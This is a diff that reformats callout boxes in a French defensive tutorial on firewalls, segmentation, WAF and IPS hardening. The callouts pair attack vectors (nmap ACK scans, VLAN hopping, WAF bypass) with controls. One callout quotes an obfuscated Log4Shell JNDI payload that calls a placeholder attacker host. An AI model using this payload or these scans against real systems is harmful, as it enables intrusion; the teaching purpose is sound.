@@ -67,7 +67,8 @@ Un attaquant n'attaque pas « le pare-feu ». Il cherche ce que vos règles lais
 | IPv6 non filtré | Tout le réseau | Les règles IPv4 sont strictes, l'IPv6 est ouvert |
 | Règles obsolètes jamais nettoyées | Prestataires et projets terminés | Accès fantômes vers des systèmes encore actifs |
 
-🧠 **Concept clé** : un pare-feu applique la première règle qui correspond. Une règle trop large placée haut dans la liste masque (shadow) toutes celles qui suivent. L'ordre compte autant que le contenu.
+> 🧠 **Concept clé** : un pare-feu applique la première règle qui correspond. Une règle trop large placée haut dans la liste masque (shadow) toutes celles qui suivent. L'ordre compte autant que le contenu.
+{: .callout .callout-important}
 
 ---
 
@@ -77,7 +78,8 @@ Un attaquant n'attaque pas « le pare-feu ». Il cherche ce que vos règles lais
 
 Un filtre **stateless** (ACL sur un switch L3, routeur) juge chaque paquet isolément : IP source/destination, protocole, port, éventuellement flags TCP. Pour laisser passer les réponses, on écrit souvent `permit tcp any any established`. Ce mot-clé ne vérifie aucune connexion. Il laisse passer tout paquet portant ACK ou RST.
 
-🔴 **Vecteur d'attaque** : le scan ACK de nmap exploite ça.
+> 🔴 **Vecteur d'attaque** : le scan ACK de nmap exploite ça.
+{: .callout .callout-danger}
 
 ```bash
 nmap -Pn -sA -p 1-1024 <HOST>
@@ -89,7 +91,8 @@ Un filtre **stateful** mémorise chaque flux dans une table (`conntrack`*). Une 
 
 \* `conntrack` : sous-système du noyau Linux qui garde l'état de chaque flux (NEW, ESTABLISHED, RELATED) dans une table de taille bornée.
 
-⚠️ **Coût réel** : cette table a une limite (`net.netfilter.nf_conntrack_max`). Un flood de SYN ou de connexions UDP la sature. Le noyau logue alors `nf_conntrack: table full, dropping packet` et le pare-feu devient lui-même le point de déni de service. Surveillez le ratio `nf_conntrack_count / nf_conntrack_max` et dimensionnez selon la RAM (chaque entrée coûte environ 300 octets).
+> ⚠️ **Coût réel** : cette table a une limite (`net.netfilter.nf_conntrack_max`). Un flood de SYN ou de connexions UDP la sature. Le noyau logue alors `nf_conntrack: table full, dropping packet` et le pare-feu devient lui-même le point de déni de service. Surveillez le ratio `nf_conntrack_count / nf_conntrack_max` et dimensionnez selon la RAM (chaque entrée coûte environ 300 octets).
+{: .callout .callout-attention}
 
 ### Une politique par défaut qui refuse
 
@@ -128,9 +131,11 @@ table inet filter {
 
 La chaîne `output` en `policy drop` est ce qui aurait arrêté le reverse shell de notre scénario.
 
-🔒 **Contrôle de sécurité** : le filtrage sortant est le contrôle le plus rentable et le plus souvent absent. Il casse la phase « appel vers l'extérieur » de la plupart des attaques. Son coût est opérationnel : chaque mise à jour, chaque appel d'API tierce doit être déclaré. Un serveur de production qui doit joindre vingt domaines SaaS rend l'allowlist pénible. C'est un arbitrage à assumer par zone : strict en DMZ, plus souple pour les postes (avec proxy et journalisation).
+> 🔒 **Contrôle de sécurité** : le filtrage sortant est le contrôle le plus rentable et le plus souvent absent. Il casse la phase « appel vers l'extérieur » de la plupart des attaques. Son coût est opérationnel : chaque mise à jour, chaque appel d'API tierce doit être déclaré. Un serveur de production qui doit joindre vingt domaines SaaS rend l'allowlist pénible. C'est un arbitrage à assumer par zone : strict en DMZ, plus souple pour les postes (avec proxy et journalisation).
+{: .callout .callout-securite}
 
-💡 **Astuce** : avant d'appliquer, vérifiez la syntaxe, puis prévoyez un retour arrière pour ne pas vous couper l'accès SSH.
+> 💡 **Astuce** : avant d'appliquer, vérifiez la syntaxe, puis prévoyez un retour arrière pour ne pas vous couper l'accès SSH.
+{: .callout .callout-astuce}
 
 ```bash
 nft -c -f /etc/nftables.conf
@@ -191,12 +196,14 @@ Les règles de conception qui comptent :
 - **L'administration passe par un bastion**, pas par des règles `admin_net → tout`.
 - **Un flux autorisé par sens.** La DMZ n'initie pas vers le LAN, et le LAN n'initie pas vers la DMZ sans raison.
 
-🔴 **Vecteur d'attaque : VLAN hopping.** Deux techniques classiques (outil : `yersinia`) :
+> 🔴 **Vecteur d'attaque : VLAN hopping.** Deux techniques classiques (outil : `yersinia`) :
+>
+> - *Switch spoofing* : l'attaquant envoie des trames DTP (Dynamic Trunking Protocol) et négocie un trunk, ce qui lui donne accès à tous les VLAN.
+> - *Double tagging* : une trame avec deux tags 802.1Q. Le premier switch retire le tag du VLAN natif et la trame arrive dans le VLAN cible. L'attaque est unidirectionnelle mais suffit pour envoyer un exploit.
+{: .callout .callout-danger}
 
-- *Switch spoofing* : l'attaquant envoie des trames DTP (Dynamic Trunking Protocol) et négocie un trunk, ce qui lui donne accès à tous les VLAN.
-- *Double tagging* : une trame avec deux tags 802.1Q. Le premier switch retire le tag du VLAN natif et la trame arrive dans le VLAN cible. L'attaque est unidirectionnelle mais suffit pour envoyer un exploit.
-
-🔒 **Contrôle de sécurité** (Cisco IOS, adapter selon l'équipementier) :
+> 🔒 **Contrôle de sécurité** (Cisco IOS, adapter selon l'équipementier) :
+{: .callout .callout-securite}
 
 ```
 interface GigabitEthernet0/10
@@ -246,14 +253,17 @@ Include /etc/modsecurity/crs/rules/*.conf
 
 Les chemins et directives dépendent de la distribution et de la version du module.
 
-🔴 **Vecteurs d'attaque contre un WAF** :
+> 🔴 **Vecteurs d'attaque contre un WAF** :
+>
+> - **Contournement par encodage** : les premières règles contre Log4Shell (CVE-2021-44228) bloquaient `${jndi:`, et les attaquants sont passés à `${${lower:j}ndi:ldap://<ATTACKER>/a}`. Un WAF à signatures court derrière les variantes.
+> - **Contournement par l'origine** : si l'IP du serveur d'origine est connue (historique DNS, certificats exposés, Shodan) et joignable, l'attaquant parle directement à l'application et le WAF ne voit rien.
+{: .callout .callout-danger}
 
-- **Contournement par encodage** : les premières règles contre Log4Shell (CVE-2021-44228) bloquaient `${jndi:`, et les attaquants sont passés à `${${lower:j}ndi:ldap://<ATTACKER>/a}`. Un WAF à signatures court derrière les variantes.
-- **Contournement par l'origine** : si l'IP du serveur d'origine est connue (historique DNS, certificats exposés, Shodan) et joignable, l'attaquant parle directement à l'application et le WAF ne voit rien.
+> 🔒 **Contrôle de sécurité** : le pare-feu de l'origine n'accepte le 443/8443 que depuis les IP du reverse proxy ou du WAF (ou exige une authentification mutuelle TLS). Cette règle est la plus oubliée des déploiements WAF.
+{: .callout .callout-securite}
 
-🔒 **Contrôle de sécurité** : le pare-feu de l'origine n'accepte le 443/8443 que depuis les IP du reverse proxy ou du WAF (ou exige une authentification mutuelle TLS). Cette règle est la plus oubliée des déploiements WAF.
-
-⚠️ **Coût réel** : un WAF en mode blocage sans phase d'observation bloque du trafic légitime (formulaires riches, API JSON avec balises). Commencez en `DetectionOnly`, analysez les logs d'audit, ajoutez des exclusions ciblées par URL, puis basculez. Monter le niveau de paranoïa du CRS augmente la détection et les faux positifs ensemble.
+> ⚠️ **Coût réel** : un WAF en mode blocage sans phase d'observation bloque du trafic légitime (formulaires riches, API JSON avec balises). Commencez en `DetectionOnly`, analysez les logs d'audit, ajoutez des exclusions ciblées par URL, puis basculez. Monter le niveau de paranoïa du CRS augmente la détection et les faux positifs ensemble.
+{: .callout .callout-attention}
 
 ---
 
@@ -317,7 +327,8 @@ Reprenons le scénario d'ouverture et regardons ce que `allow DMZ → LAN any an
 
 Une autre forme du même piège : une règle étroite et correcte placée **sous** une règle large. Elle n'est jamais atteinte et personne ne s'en aperçoit.
 
-🔒 **Comment la repérer** :
+> 🔒 **Comment la repérer** :
+{: .callout .callout-securite}
 
 ```bash
 nft list ruleset                       # lire l'ordre et les compteurs (si "counter" est présent)
@@ -400,33 +411,47 @@ Le compromis : le gain en sécurité est immédiat, le risque est de couper un f
 
 ## Erreurs fréquentes
 
-⚠️ **Politique par défaut `ACCEPT` avec quelques `DROP`**
-- Conséquence : tout port nouvellement ouvert par un service est exposé sans que personne ne l'ait décidé.
-- Correction : `policy drop` sur `input`, `forward` et `output`, puis n'ouvrir que le nécessaire. Détection : `nmap -p-` depuis l'extérieur et comparaison avec la liste des services attendus.
+> ⚠️ **Politique par défaut `ACCEPT` avec quelques `DROP`**
+>
+> - Conséquence : tout port nouvellement ouvert par un service est exposé sans que personne ne l'ait décidé.
+> - Correction : `policy drop` sur `input`, `forward` et `output`, puis n'ouvrir que le nécessaire. Détection : `nmap -p-` depuis l'extérieur et comparaison avec la liste des services attendus.
+{: .callout .callout-attention}
 
-⚠️ **Règles IPv4 strictes, IPv6 oublié**
-- Conséquence : `iptables` est configuré mais `ip6tables` est vide. Le service reste joignable via l'IPv6 global de la machine.
-- Correction : nftables en famille `inet`, ou politique `drop` aussi pour IPv6. Détection : `nmap -6 -p- <HOST6>`.
+> ⚠️ **Règles IPv4 strictes, IPv6 oublié**
+>
+> - Conséquence : `iptables` est configuré mais `ip6tables` est vide. Le service reste joignable via l'IPv6 global de la machine.
+> - Correction : nftables en famille `inet`, ou politique `drop` aussi pour IPv6. Détection : `nmap -6 -p- <HOST6>`.
+{: .callout .callout-attention}
 
-⚠️ **`permit tcp any any established` en ACL**
-- Conséquence : un scan ACK passe, et un attaquant dans la zone peut forger des paquets ACK vers n'importe quel hôte.
-- Correction : un pare-feu stateful entre les zones, ou des règles `established` limitées à des hôtes et ports sources précis.
+> ⚠️ **`permit tcp any any established` en ACL**
+>
+> - Conséquence : un scan ACK passe, et un attaquant dans la zone peut forger des paquets ACK vers n'importe quel hôte.
+> - Correction : un pare-feu stateful entre les zones, ou des règles `established` limitées à des hôtes et ports sources précis.
+{: .callout .callout-attention}
 
-⚠️ **Règle « temporaire » sans date d'expiration**
-- Conséquence : l'ouverture devient permanente et personne ne s'en souvient.
-- Correction : règle avec propriétaire, ticket et date de fin. Revue périodique des règles à zéro hit.
+> ⚠️ **Règle « temporaire » sans date d'expiration**
+>
+> - Conséquence : l'ouverture devient permanente et personne ne s'en souvient.
+> - Correction : règle avec propriétaire, ticket et date de fin. Revue périodique des règles à zéro hit.
+{: .callout .callout-attention}
 
-⚠️ **WAF devant un serveur d'origine joignable**
-- Conséquence : l'attaquant contourne le WAF en visant l'IP d'origine.
-- Correction : le pare-feu de l'origine n'accepte que les IP du WAF ou une authentification mutuelle TLS. Détection : le `curl --resolve` du tableau de tests.
+> ⚠️ **WAF devant un serveur d'origine joignable**
+>
+> - Conséquence : l'attaquant contourne le WAF en visant l'IP d'origine.
+> - Correction : le pare-feu de l'origine n'accepte que les IP du WAF ou une authentification mutuelle TLS. Détection : le `curl --resolve` du tableau de tests.
+{: .callout .callout-attention}
 
-⚠️ **IPS en blocage dès le premier jour**
-- Conséquence : un faux positif sur une règle générique coupe un flux métier.
-- Correction : IDS d'abord, `drop` seulement sur les `sid` à haute confiance, avec liste de contournement documentée.
+> ⚠️ **IPS en blocage dès le premier jour**
+>
+> - Conséquence : un faux positif sur une règle générique coupe un flux métier.
+> - Correction : IDS d'abord, `drop` seulement sur les `sid` à haute confiance, avec liste de contournement documentée.
+{: .callout .callout-attention}
 
-⚠️ **Interface d'administration du pare-feu sur l'interface WAN**
-- Conséquence : exposition aux CVE de l'équipement lui-même.
-- Correction : écoute limitée à une interface de management dédiée, accès par bastion ou VPN avec MFA.
+> ⚠️ **Interface d'administration du pare-feu sur l'interface WAN**
+>
+> - Conséquence : exposition aux CVE de l'équipement lui-même.
+> - Correction : écoute limitée à une interface de management dédiée, accès par bastion ou VPN avec MFA.
+{: .callout .callout-attention}
 
 ---
 
